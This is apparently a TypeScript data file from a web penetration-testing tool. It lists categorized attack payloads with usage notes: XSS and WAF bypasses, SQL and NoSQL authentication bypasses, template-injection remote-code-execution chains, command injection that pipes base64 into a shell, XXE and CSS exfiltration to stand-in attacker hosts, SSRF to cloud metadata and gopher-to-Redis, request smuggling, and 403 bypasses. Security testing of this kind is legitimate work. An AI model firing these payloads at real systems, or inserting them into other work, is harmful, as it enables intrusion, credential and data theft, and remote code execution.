import type { PillarId } from '@/types';

export interface PayloadCrossLink {
  pillar: PillarId;
  moduleId: string;
  label: string;
}

export interface Payload {
  id: string;
  label: string;
  value: string;
  note?: string;
}

export interface PayloadCategory {
  id: string;
  name: string;
  payloads: Payload[];
  crossLink?: PayloadCrossLink;
  note?: string;
}

export const PAYLOAD_CATEGORIES: PayloadCategory[] = [
  {
    id: 'xss',
    name: 'XSS',
    payloads: [
      { id: 'xss-basic', label: 'Basic script', value: `<script>alert(1)</script>` },
      { id: 'xss-img', label: 'img onerror', value: `<img src=x onerror=alert(1)>` },
      { id: 'xss-svg', label: 'svg onload', value: `<svg onload=alert(1)>` },
      {
        id: 'xss-polyglot',
        label: 'Polyglot',
        value: `jaVasCript:/*-/*\`/*\\\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e`,
        note: 'Fires in many different injection contexts at once.',
      },
      {
        id: 'xss-waf-case',
        label: 'WAF bypass - mixed case',
        value: `<ScRiPt>alert(1)</ScRiPt>`,
      },
      {
        id: 'xss-waf-double',
        label: 'WAF bypass - keyword doubling',
        value: `<img src=x oneonerrorrror=alert(1)>`,
        note: 'Defeats naive single-pass keyword stripping.',
      },
      {
        id: 'xss-waf-char',
        label: 'WAF bypass - fromCharCode',
        value: `<svg/onload=alert(String.fromCharCode(88,83,83))>`,
      },
    ],
  },
  {
    id: 'xss-modern-bypass',
    name: 'XSS modern bypasses',
    payloads: [
      {
        id: 'xss-template-literal',
        label: 'Template-literal injection (no parens/quotes)',
        value: `<img src=x onerror=alert\`1\`>`,
        note: 'Template literals let you call a function without parentheses, defeating filters that only block ().',
      },
      {
        id: 'xss-dom-clobbering',
        label: 'DOM clobbering (overwrite a global reference)',
        value: `<form id=x><input id=y name=action></form><script>x.y</script>`,
        note: 'Named HTML elements can clobber same-named JS globals, useful when script injection itself is blocked.',
      },
      {
        id: 'xss-trusted-types-bypass',
        label: 'Trusted Types bypass via default policy quirk',
        value: `<a href="javascript:void(0)" onclick="Function('ale'+'rt(1)')()">click</a>`,
        note: 'Some Trusted Types default policies allow dynamic Function construction; verify against the target CSP.',
      },
      {
        id: 'xss-css-expression',
        label: 'CSS-based exfil (attribute selector leak)',
        value: `<style>input[value^="a"]{background:url(//attacker.example/log?a)}</style>`,
        note: 'Leaks input values character-by-character in contexts where script execution is fully blocked.',
      },
      {
        id: 'xss-markdown-html',
        label: 'Markdown-to-HTML renderer bypass',
        value: `[x](javascript:alert(1))`,
        note: 'Many Markdown renderers allow javascript: link targets unless explicitly sanitized.',
      },
    ],
  },
  {
    id: 'sqli',
    name: 'SQLi',
    payloads: [
      { id: 'sqli-authbypass', label: 'Auth bypass', value: `' OR '1'='1` },
      { id: 'sqli-authbypass2', label: 'Auth bypass - comment', value: `admin'--` },
      { id: 'sqli-union', label: 'UNION probe', value: `' UNION SELECT NULL,NULL,NULL--` },
      {
        id: 'sqli-error',
        label: 'Error-based (MySQL)',
        value: `' AND extractvalue(1,concat(0x7e,(SELECT version())))--`,
      },
      { id: 'sqli-boolean-true', label: 'Boolean-based (true)', value: `' AND 1=1--` },
      { id: 'sqli-boolean-false', label: 'Boolean-based (false)', value: `' AND 1=2--` },
      { id: 'sqli-time-mysql', label: 'Time-based (MySQL)', value: `' AND SLEEP(5)--` },
      { id: 'sqli-time-mssql', label: 'Time-based (MSSQL)', value: `'; WAITFOR DELAY '0:0:5'--` },
    ],
  },
  {
    id: 'sqli-bypass',
    name: 'SQLi advanced bypass',
    payloads: [
      { id: 'sqli-bypass-inline-comment', label: 'Inline comment (spaces filtered)', value: `'/**/OR/**/'1'='1` },
      { id: 'sqli-bypass-case', label: 'Mixed-case keyword bypass', value: `' UnIoN SeLeCt NULL,NULL--` },
      {
        id: 'sqli-bypass-doubled',
        label: 'Doubled keyword (naive single-pass strip)',
        value: `' UNIunionON SELselectECT NULL,NULL--`,
      },
      { id: 'sqli-bypass-hex', label: 'Hex-encoded string literal', value: `' OR 1=1--0x2d2d` },
      {
        id: 'sqli-bypass-unicode',
        label: 'Unicode/overlong-encoding quote bypass',
        value: `%bf%27 OR 1=1--`,
        note: 'Targets legacy GBK/Big5-aware backends where a leading multi-byte char eats an escaping backslash.',
      },
      { id: 'sqli-bypass-null-byte', label: 'Null-byte before comment', value: `' OR 1=1%00--` },
      { id: 'sqli-bypass-versioned-comment', label: 'MySQL versioned comment (WAF-transparent)', value: `/*!50000UNION*/ /*!50000SELECT*/ NULL,NULL--` },
    ],
  },
  {
    id: 'lfi-rfi',
    name: 'LFI / RFI',
    payloads: [
      { id: 'lfi-basic', label: 'Path traversal', value: `../../../../etc/passwd` },
      { id: 'lfi-encoded', label: 'Path traversal - encoded dots', value: `....//....//....//etc/passwd` },
      {
        id: 'lfi-php-filter',
        label: 'PHP filter wrapper (source disclosure)',
        value: `php://filter/convert.base64-encode/resource=index.php`,
      },
      {
        id: 'lfi-data-wrapper',
        label: 'PHP data wrapper',
        value: `data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==`,
        note: 'Decodes to <?php phpinfo(); ?> - for authorized RCE-chain testing only.',
      },
      { id: 'rfi-basic', label: 'RFI probe', value: `http://ATTACKER-HOST/test.txt?` },
    ],
  },
  {
    id: 'ssti',
    name: 'SSTI',
    payloads: [
      { id: 'ssti-jinja', label: 'Jinja2/Twig probe', value: `{{7*7}}` },
      { id: 'ssti-freemarker', label: 'FreeMarker probe', value: `${7*7}` },
      { id: 'ssti-erb', label: 'ERB probe', value: `<%= 7*7 %>` },
      { id: 'ssti-polyglot', label: 'Multi-engine polyglot probe', value: `\${{<%[%'"}}%\\.` },
      { id: 'ssti-jinja-config', label: 'Jinja2 config disclosure', value: `{{config}}` },
    ],
  },
  {
    id: 'ssti-framework',
    name: 'SSTI framework-specific',
    payloads: [
      {
        id: 'ssti-jinja-rce',
        label: 'Jinja2/Flask RCE via __globals__',
        value: `{{ ''.__class__.__mro__[1].__subclasses__()[406]('cat /etc/passwd',shell=True,stdout=-1).communicate() }}`,
        note: 'The subclass index (406) is environment-dependent; enumerate __subclasses__() first.',
      },
      {
        id: 'ssti-freemarker-rce',
        label: 'FreeMarker RCE via Execute',
        value: `<#assign ex="freemarker.template.utility.Execute"?new()>\${ex("id")}`,
      },
      {
        id: 'ssti-velocity-rce',
        label: 'Velocity RCE via Runtime.exec',
        value: `#set($e="exp")$e.getClass().forName("java.lang.Runtime").getMethod("exec",$e.getClass().forName("java.lang.String")).invoke($e.getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")`,
      },
      {
        id: 'ssti-pebble-rce',
        label: 'Pebble RCE',
        value: `{% set cmd = "id" %}{{ cmd | eval }}`,
        note: 'Only affects Pebble templates with the (rare) eval extension enabled.',
      },
      {
        id: 'ssti-thymeleaf-rce',
        label: 'Thymeleaf RCE (SSTI via expression preprocessing)',
        value: `\${T(java.lang.Runtime).getRuntime().exec('id')}`,
      },
    ],
  },
  {
    id: 'cmdi',
    name: 'Command injection',
    payloads: [
      { id: 'cmdi-semicolon', label: 'Chain - semicolon', value: `; id` },
      { id: 'cmdi-pipe', label: 'Chain - pipe', value: `| id` },
      { id: 'cmdi-backtick', label: 'Substitution - backticks', value: '`id`' },
      { id: 'cmdi-dollar', label: 'Substitution - $()', value: `$(id)` },
      { id: 'cmdi-newline', label: 'Newline - encoded', value: `%0aid` },
      { id: 'cmdi-and', label: 'Chain - AND', value: `&& id` },
      { id: 'cmdi-or', label: 'Chain - OR (short-circuit)', value: `|| id` },
    ],
  },
  {
    id: 'cmdi-encoded',
    name: 'Command injection encoded',
    payloads: [
      { id: 'cmdi-enc-url', label: 'URL-encoded semicolon + id', value: `%3Bid` },
      { id: 'cmdi-enc-ifs', label: 'IFS substitution (spaces filtered)', value: `;{cat,/etc/passwd}` },
      { id: 'cmdi-enc-ifs-var', label: 'IFS environment variable', value: `;cat$IFS/etc/passwd` },
      {
        id: 'cmdi-enc-base64',
        label: 'Base64-wrapped payload piped to shell',
        value: `;echo aWQ=|base64 -d|sh`,
        note: 'Decodes to "id". Swap the base64 for any command, useful when raw shell metacharacters are filtered.',
      },
      { id: 'cmdi-enc-hex', label: 'Hex-escaped path (bypass string filters)', value: `;cat /e??/pa??wd` },
    ],
  },
  {
    id: 'xxe',
    name: 'XXE',
    payloads: [
      {
        id: 'xxe-basic',
        label: 'External entity - file read',
        value: `<?xml version="1.0"?>\n<!DOCTYPE data [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n<data>&xxe;</data>`,
      },
      {
        id: 'xxe-ssrf',
        label: 'External entity - SSRF',
        value: `<?xml version="1.0"?>\n<!DOCTYPE data [<!ENTITY xxe SYSTEM "http://ATTACKER-HOST/">]>\n<data>&xxe;</data>`,
      },
      {
        id: 'xxe-parameter-entity',
        label: 'Parameter entity - OOB exfil via external DTD',
        value: `<?xml version="1.0"?>\n<!DOCTYPE data [<!ENTITY % remote SYSTEM "http://ATTACKER-HOST/evil.dtd">%remote;]>\n<data>&exfil;</data>`,
        note: 'evil.dtd on your server defines %exfil; reading a local file and posting it back out-of-band. For blind XXE where responses are not reflected.',
      },
      {
        id: 'xxe-error-based',
        label: 'Error-based - force file content into an error message',
        value: `<?xml version="1.0"?>\n<!DOCTYPE data [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">%eval;%error;]>`,
        note: 'Triggers a parser error containing the file content when direct exfiltration is blocked.',
      },
      {
        id: 'xxe-svg',
        label: 'SVG-based XXE (image upload)',
        value: `<?xml version="1.0" standalone="yes"?>\n<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n<svg width="100" height="100">\n<text x="0" y="15">&xxe;</text>\n</svg>`,
        note: 'Upload as a .svg file where images are processed/rendered server-side.',
      },
    ],
  },
  {
    id: 'open-redirect',
    name: 'Open redirect',
    payloads: [
      { id: 'redir-param', label: 'Redirect param', value: `https://target.tld/redirect?url=https://evil.tld` },
      { id: 'redir-protocol-relative', label: 'Protocol-relative', value: `//evil.tld` },
      { id: 'redir-backslash', label: 'Backslash trick', value: `/\\evil.tld` },
      { id: 'redir-at', label: '@ trick', value: `https://target.tld@evil.tld` },
      { id: 'redir-dot', label: 'Whitelisted-domain confusion', value: `https://target.tld.evil.tld` },
      { id: 'redir-encoded-dot', label: 'Encoded dot bypass', value: `https://target%2etld@evil.tld` },
    ],
  },
  {
    id: 'path-traversal',
    name: 'Path traversal',
    payloads: [
      { id: 'pt-basic', label: 'Basic traversal (Linux)', value: `../../../../etc/passwd` },
      { id: 'pt-windows', label: 'Basic traversal (Windows)', value: `..\\..\\..\\..\\windows\\win.ini` },
      { id: 'pt-null-byte', label: 'Null-byte suffix (legacy PHP)', value: `../../../../etc/passwd%00.png` },
      { id: 'pt-absolute', label: 'Absolute path (traversal filtered)', value: `/etc/passwd` },
    ],
  },
  {
    id: 'path-traversal-encoded',
    name: 'Path traversal encoded',
    payloads: [
      { id: 'pt-enc-url', label: 'Single URL-encoded', value: `..%2f..%2f..%2f..%2fetc%2fpasswd` },
      { id: 'pt-enc-double', label: 'Double URL-encoded', value: `..%252f..%252f..%252f..%252fetc%252fpasswd` },
      { id: 'pt-enc-overlong', label: 'Overlong UTF-8 encoded slash', value: `..%c0%af..%c0%af..%c0%afetc%c0%afpasswd` },
      { id: 'pt-enc-16bit', label: 'Unicode-encoded backslash (Windows/IIS)', value: `..%u2216..%u2216windows%u2216win.ini` },
      { id: 'pt-enc-doubledot', label: 'Non-standard dot-dot (filter bypass)', value: `....//....//....//etc/passwd` },
    ],
  },
  {
    id: 'ssrf',
    name: 'SSRF',
    payloads: [
      { id: 'ssrf-localhost', label: 'Localhost probe', value: `http://127.0.0.1/` },
      { id: 'ssrf-cloud-metadata-aws', label: 'AWS/GCP metadata endpoint', value: `http://169.254.169.254/latest/meta-data/` },
      { id: 'ssrf-cloud-metadata-azure', label: 'Azure metadata endpoint', value: `http://169.254.169.254/metadata/instance?api-version=2021-02-01` },
      { id: 'ssrf-dns-rebind', label: 'Decimal IP encoding (filter bypass)', value: `http://2130706433/` },
      { id: 'ssrf-alt-loopback', label: 'Alternate loopback notation', value: `http://0177.0.0.1/` },
    ],
  },
  {
    id: 'ssrf-smuggling',
    name: 'SSRF protocol smuggling',
    payloads: [
      { id: 'ssrf-file', label: 'file:// local read', value: `file:///etc/passwd` },
      { id: 'ssrf-gopher', label: 'Gopher protocol (raw TCP smuggling)', value: `gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A` },
      { id: 'ssrf-dict', label: 'dict:// internal service probe', value: `dict://127.0.0.1:11211/stat` },
      { id: 'ssrf-redirect-bypass', label: 'Open-redirect-chained SSRF (bypass allowlist)', value: `https://trusted.tld/redirect?url=http://127.0.0.1/` },
    ],
  },
  {
    id: 'nosqli',
    name: 'NoSQL injection',
    payloads: [
      { id: 'nosqli-authbypass', label: 'Auth bypass ($ne)', value: `{"username":{"$ne":null},"password":{"$ne":null}}` },
      { id: 'nosqli-authbypass-query', label: 'Auth bypass (query-string form)', value: `username[$ne]=&password[$ne]=` },
      { id: 'nosqli-regex', label: 'Blind extraction via $regex', value: `{"username":"admin","password":{"$regex":"^a"}}` },
      { id: 'nosqli-where', label: 'JS injection via $where', value: `{"$where":"sleep(5000)"}` },
    ],
  },
  {
    id: 'nosqli-advanced',
    name: 'NoSQL injection advanced',
    payloads: [
      {
        id: 'nosqli-adv-blind-length',
        label: 'Blind boolean - password length',
        value: `{"username":"admin","password":{"$regex":"^.{8}$"}}`,
      },
      {
        id: 'nosqli-adv-or',
        label: 'Auth bypass via $or',
        value: `{"$or":[{"username":"admin"},{"username":"root"}],"password":{"$ne":""}}`,
      },
      {
        id: 'nosqli-adv-js-sandbox',
        label: 'JS sandbox escape via $where (MongoDB mapReduce)',
        value: `{"$where":"function(){return this.a.constructor.constructor('return process')().mainModule.require('child_process').execSync('id')}"}`,
        note: 'Only affects MongoDB configurations with server-side JS execution enabled (disabled by default in modern versions).',
      },
    ],
  },
  {
    id: 'ldapi',
    name: 'LDAP injection',
    payloads: [
      { id: 'ldapi-authbypass', label: 'Auth bypass (always-true filter)', value: `*)(uid=*))(|(uid=*` },
      { id: 'ldapi-wildcard', label: 'Wildcard search', value: `admin*` },
      { id: 'ldapi-blind-true', label: 'Blind - always true', value: `*)(&)` },
      { id: 'ldapi-blind-false', label: 'Blind - always false', value: `*)(!(&)` },
    ],
  },
  {
    id: 'crlf',
    name: 'CRLF injection',
    payloads: [
      { id: 'crlf-header-inject', label: 'Response-header injection', value: `%0d%0aSet-Cookie:%20session=hijacked` },
      { id: 'crlf-response-split', label: 'Response splitting (inject a fake body)', value: `%0d%0a%0d%0a<script>alert(1)</script>` },
      { id: 'crlf-log-inject', label: 'Log injection (fake log entry)', value: `admin%0d%0a[INFO] user admin logged in successfully` },
    ],
  },
  {
    id: 'hpp',
    name: 'HTTP parameter pollution',
    payloads: [
      { id: 'hpp-duplicate', label: 'Duplicate parameter (backend inconsistency)', value: `?id=1&id=2` },
      { id: 'hpp-array', label: 'Array-style pollution', value: `?id[]=1&id[]=2` },
      {
        id: 'hpp-waf-bypass',
        label: 'WAF-inspected vs app-parsed parameter mismatch',
        value: `?id=1&id=' OR '1'='1`,
        note: 'Some WAFs inspect only the first occurrence of a repeated parameter while the app uses the last (or vice versa).',
      },
    ],
  },
  {
    id: 'request-smuggling',
    name: 'HTTP request smuggling (advanced, manual only)',
    payloads: [
      {
        id: 'smuggling-cl-te',
        label: 'CL.TE (front-end honors Content-Length, back-end honors Transfer-Encoding)',
        value: `Content-Length: 13\nTransfer-Encoding: chunked\n\n0\n\nSMUGGLED`,
        note: 'Reference only. Requires raw socket/Burp Repeater control over exact bytes and line endings; not something a normal HTTP client library can send correctly. Test manually, one request at a time, on authorized scope.',
      },
      {
        id: 'smuggling-te-cl',
        label: 'TE.CL (front-end honors Transfer-Encoding, back-end honors Content-Length)',
        value: `Transfer-Encoding: chunked\nContent-Length: 4\n\n5c\nSMUGGLED\n0\n\n`,
        note: 'Reference only, same caveats as CL.TE. Verify with a timing oracle before assuming impact.',
      },
      {
        id: 'smuggling-te-te',
        label: 'TE.TE (obfuscated Transfer-Encoding to desync both parsers differently)',
        value: `Transfer-Encoding: chunked\nTransfer-Encoding: xchunked`,
        note: 'Reference only. One of many TE-obfuscation variants; the exact one that works is target-specific.',
      },
    ],
  },
  {
    id: 'unicode-bypass',
    name: 'UTF-8 / Unicode bypass',
    payloads: [
      { id: 'unicode-overlong-slash', label: 'Overlong UTF-8 slash', value: `%c0%af` },
      { id: 'unicode-fullwidth', label: 'Fullwidth character normalization bypass', value: `＜script＞alert(1)＜/script＞` },
      { id: 'unicode-best-fit', label: 'Best-fit mapping (Windows codepage confusion)', value: `%uff1cscript%uff1e` },
      {
        id: 'unicode-zero-width',
        label: 'Zero-width character keyword split',
        value: `ad​min`,
        note: 'A zero-width space splits a blocklisted keyword while most renderers display it unchanged.',
      },
    ],
  },
  {
    id: 'headers-ip-bypass',
    name: 'Header-based: IP bypass',
    crossLink: { pillar: 'traffic', moduleId: 'headerinject', label: 'Open HeaderInject to send one of these' },
    payloads: [
      { id: 'hdr-xff-localhost', label: 'X-Forwarded-For: localhost', value: `X-Forwarded-For: 127.0.0.1` },
      { id: 'hdr-xreal-localhost', label: 'X-Real-IP: localhost', value: `X-Real-IP: 127.0.0.1` },
      { id: 'hdr-xoriginating-localhost', label: 'X-Originating-IP: localhost', value: `X-Originating-IP: 127.0.0.1` },
      { id: 'hdr-xclusterclient', label: 'X-Cluster-Client-IP: localhost', value: `X-Cluster-Client-IP: 127.0.0.1` },
      { id: 'hdr-custom-ip-auth', label: 'X-Custom-IP-Authorization (admin-panel bypass)', value: `X-Custom-IP-Authorization: 127.0.0.1` },
    ],
  },
  {
    id: 'headers-cache-poisoning',
    name: 'Header-based: web cache poisoning',
    crossLink: { pillar: 'traffic', moduleId: 'headerinject', label: 'Open HeaderInject to send one of these' },
    payloads: [
      { id: 'hdr-xfh-evil', label: 'X-Forwarded-Host: attacker domain', value: `X-Forwarded-Host: evil.example` },
      { id: 'hdr-xhost-evil', label: 'X-Host: attacker domain', value: `X-Host: evil.example` },
      { id: 'hdr-xfs-evil', label: 'X-Forwarded-Server: attacker domain', value: `X-Forwarded-Server: evil.example` },
      { id: 'hdr-xoriginal-url', label: 'X-Original-URL (path-based cache-key bypass)', value: `X-Original-URL: /admin` },
      { id: 'hdr-xrewrite-url', label: 'X-Rewrite-URL (path-based cache-key bypass)', value: `X-Rewrite-URL: /admin` },
    ],
  },
  {
    id: 'headers-useragent',
    name: 'Header-based: User-Agent test values',
    crossLink: { pillar: 'traffic', moduleId: 'uaswitch', label: 'Open UASwitch to apply one of these' },
    payloads: [
      { id: 'ua-googlebot', label: 'Googlebot (cloaking check)', value: `Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)` },
      { id: 'ua-sqli', label: 'User-Agent SQLi probe (logged header injection)', value: `' OR '1'='1` },
      { id: 'ua-xss', label: 'User-Agent XSS probe (admin log viewer)', value: `<script>alert(document.cookie)</script>` },
      { id: 'ua-empty', label: 'Empty User-Agent', value: `` },
    ],
  },
  {
    id: 'headers-injection',
    name: 'HTTP header injection',
    crossLink: { pillar: 'traffic', moduleId: 'headerinject', label: 'Open HeaderInject to send one of these' },
    payloads: [
      { id: 'hdr-inject-crlf', label: 'CRLF-injected header value', value: `test%0d%0aX-Injected: true` },
      { id: 'hdr-inject-host', label: 'Host header override (routing/cache confusion)', value: `Host: evil.example` },
      { id: 'hdr-inject-contenttype', label: 'Content-Type override (parser confusion)', value: `Content-Type: application/xml` },
      { id: 'hdr-inject-auth-bearer', label: 'Authorization: Bearer (auth-mechanism probe)', value: `Authorization: Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.` },
    ],
  },
  {
    id: 'forbidden-bypass',
    name: '403 / Forbidden bypass',
    crossLink: { pillar: 'traffic', moduleId: 'headerinject', label: 'Pair with the URL-override headers in HeaderInject' },
    payloads: [
      {
        id: 'fb-trailing-slash',
        label: 'Trailing slash',
        value: `/admin/`,
        note: 'Some routers/proxies normalize the path before their access-control check but the app router treats /admin and /admin/ as different routes.',
      },
      {
        id: 'fb-double-slash',
        label: 'Double slash',
        value: `//admin`,
      },
      {
        id: 'fb-dot-segment',
        label: 'Dot segment',
        value: `/./admin`,
      },
      {
        id: 'fb-dot-segment-trailing',
        label: 'Trailing dot segment',
        value: `/admin/.`,
      },
      {
        id: 'fb-semicolon-param',
        label: 'Semicolon path parameter (older Tomcat/Spring)',
        value: `/admin;/`,
        note: 'Everything after ; on that path segment is a matrix parameter to some frameworks but ignored by others, which is exactly the front-end/back-end disagreement this exploits.',
      },
      {
        id: 'fb-url-encoded-slash',
        label: 'URL-encoded slash',
        value: `/%2eadmin`,
      },
      {
        id: 'fb-double-encoded-slash',
        label: 'Double URL-encoded slash',
        value: `/admin%252f`,
      },
      {
        id: 'fb-case-variation',
        label: 'Case variation',
        value: `/Admin`,
        note: 'Only helps against case-sensitive access-control rules on a case-insensitive route (or vice versa).',
      },
      {
        id: 'fb-null-byte',
        label: 'Null-byte suffix',
        value: `/admin%00`,
      },
      {
        id: 'fb-wildcard',
        label: 'Trailing wildcard',
        value: `/admin/*`,
        note: 'Common against reverse-proxy ACL rules written as an exact-match on /admin that do not also cover /admin/*.',
      },
      {
        id: 'fb-backslash',
        label: 'Backslash instead of slash',
        value: `/admin\\`,
      },
      {
        id: 'fb-overlong-utf8',
        label: 'Overlong UTF-8 slash',
        value: `/%c0%afadmin`,
      },
      {
        id: 'fb-path-info',
        label: 'Extra path info round-trip',
        value: `/admin/%2e%2e/admin`,
      },
      {
        id: 'fb-encoded-whitespace',
        label: 'Encoded trailing whitespace',
        value: `/admin%20`,
      },
    ],
    note: 'Rewrite one path segment at a time against the blocked path, and combine with the URL-override headers above (X-Original-URL, X-Rewrite-URL) and a method change (see the header-injection categories) rather than treating this as a separate attack, a 403 bypass is a front-end/back-end parsing disagreement.',
  },
];
